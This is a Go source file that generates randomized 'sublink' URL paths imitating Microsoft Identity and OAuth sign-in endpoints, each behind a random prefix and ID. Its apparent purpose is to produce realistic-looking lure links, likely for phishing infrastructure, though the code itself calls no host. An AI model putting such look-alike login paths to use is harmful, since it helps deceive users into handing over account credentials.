package templates

import (
	"crypto/rand"
	"fmt"
	"math/big"
)

// SublinkTemplate defines a predefined path template
type SublinkTemplate struct {
	ID          int      `json:"id"`
	Name        string   `json:"name"`
	Path        string   `json:"path"`
	Endpoints   []string `json:"endpoints"`
	Description string   `json:"description"`
}

// pathVariations defines realistic path variations for each template type
var pathVariations = map[int][]string{
	1: { // Microsoft Identity variations
		"common/identity/v2.0",
		"common/oauth2/v2.0",
		"common/confirm/v2.1",
		"tenant/identity/v2.0",
		"common/oauth/v2.0",
		"identity/v2.0",
	},
	2: { // Session Management variations
		"session",
		"auth/session",
		"identity/session",
		"oauth/session",
		"api/session",
		"v2/session",
	},
	3: { // Enterprise Identity variations
		"organizations/identity/v2.0",
		"organizations/oauth2/v2.0",
		"organizations/identity/v2.1",
		"tenant/organizations/v2.0",
		"enterprise/identity/v2.0",
		"orgs/identity/v2.0",
	},
}

// endpointVariations defines core + optional endpoints for each template
var endpointVariations = map[int]map[string][]string{
	1: { // Microsoft Identity
		"core":     {"connect", "token", "authorize", "userinfo", "approve", "confirm"},
		"optional": {"device", "profile", "keys", "revoke"},
	},
	2: { // Session Management
		"core":     {"start", "process", "accept"},
		"optional": {"validate", "continue", "refresh", "status", "cleanup"},
	},
	3: { // Enterprise Identity
		"core":     {"connect", "token"},
		"optional": {"consent", "device", "admin", "policy", "compliance"},
	},
}

// randomSelect picks a random item from a slice
func randomSelect(items []string) string {
	if len(items) == 0 {
		return ""
	}
	num, _ := rand.Int(rand.Reader, big.NewInt(int64(len(items))))
	return items[num.Int64()]
}

// generateDynamicEndpoints creates a realistic endpoint list for a template
func generateDynamicEndpoints(templateID int) []string {
	variations, exists := endpointVariations[templateID]
	if !exists {
		return []string{"connect", "token"} // fallback
	}

	// Always include core endpoints
	endpoints := make([]string, len(variations["core"]))
	copy(endpoints, variations["core"])

	// Add 2-4 random optional endpoints
	optional := variations["optional"]
	numOptional, _ := rand.Int(rand.Reader, big.NewInt(3)) // 0-2
	numOptional = big.NewInt(numOptional.Int64() + 2)      // 2-4

	used := make(map[string]bool)
	for i := 0; i < int(numOptional.Int64()) && i < len(optional); i++ {
		for {
			endpoint := randomSelect(optional)
			if !used[endpoint] {
				endpoints = append(endpoints, endpoint)
				used[endpoint] = true
				break
			}
		}
	}

	return endpoints
}

// GetAvailableTemplates returns all predefined sublink templates with dynamic variations
func GetAvailableTemplates() []SublinkTemplate {
	templates := []SublinkTemplate{
		{
			ID:          1,
			Name:        "Microsoft Identity",
			Path:        randomSelect(pathVariations[1]),
			Endpoints:   generateDynamicEndpoints(1),
			Description: "Microsoft Identity platform flow",
		},
		{
			ID:          2,
			Name:        "Session Management",
			Path:        randomSelect(pathVariations[2]),
			Endpoints:   generateDynamicEndpoints(2),
			Description: "Session management flow",
		},
		{
			ID:          3,
			Name:        "Enterprise Identity",
			Path:        randomSelect(pathVariations[3]),
			Endpoints:   generateDynamicEndpoints(3),
			Description: "Enterprise identity platform",
		},
	}

	return templates
}

// GenerateRandomPrefix creates a random 5-character alphanumeric prefix
func GenerateRandomPrefix() string {
	const chars = "abcdefghijklmnopqrstuvwxyz0123456789"
	result := make([]byte, 5)

	for i := range result {
		num, _ := rand.Int(rand.Reader, big.NewInt(int64(len(chars))))
		result[i] = chars[num.Int64()]
	}

	return string(result)
}

// GenerateUniqueID creates a random 8-character identifier
func GenerateUniqueID() string {
	const chars = "abcdef0123456789"
	result := make([]byte, 8)

	for i := range result {
		num, _ := rand.Int(rand.Reader, big.NewInt(int64(len(chars))))
		result[i] = chars[num.Int64()]
	}

	return string(result)
}

// BuildSublinkPath constructs a full sublink path from template and endpoint
func BuildSublinkPath(templateID int, endpoint string) (string, error) {
	templates := GetAvailableTemplates()

	var selectedTemplate *SublinkTemplate
	for _, template := range templates {
		if template.ID == templateID {
			selectedTemplate = &template
			break
		}
	}

	if selectedTemplate == nil {
		return "", fmt.Errorf("template ID %d not found", templateID)
	}

	// Auto-select first endpoint if none provided
	if endpoint == "" && len(selectedTemplate.Endpoints) > 0 {
		endpoint = selectedTemplate.Endpoints[0]
	}

	// Check if endpoint is valid for this template
	validEndpoint := false
	for _, ep := range selectedTemplate.Endpoints {
		if ep == endpoint {
			validEndpoint = true
			break
		}
	}

	if !validEndpoint {
		return "", fmt.Errorf("endpoint '%s' not valid for template '%s'", endpoint, selectedTemplate.Name)
	}

	// Build the full path: [random-5]/[template-path]/[unique-8]/[endpoint]
	randomPrefix := GenerateRandomPrefix()
	uniqueID := GenerateUniqueID()

	fullPath := fmt.Sprintf("%s/%s/%s/%s", randomPrefix, selectedTemplate.Path, uniqueID, endpoint)
	return fullPath, nil
}

// GetTemplateByID returns a specific template by ID
func GetTemplateByID(templateID int) (*SublinkTemplate, error) {
	templates := GetAvailableTemplates()

	for _, template := range templates {
		if template.ID == templateID {
			return &template, nil
		}
	}

	return nil, fmt.Errorf("template ID %d not found", templateID)
}
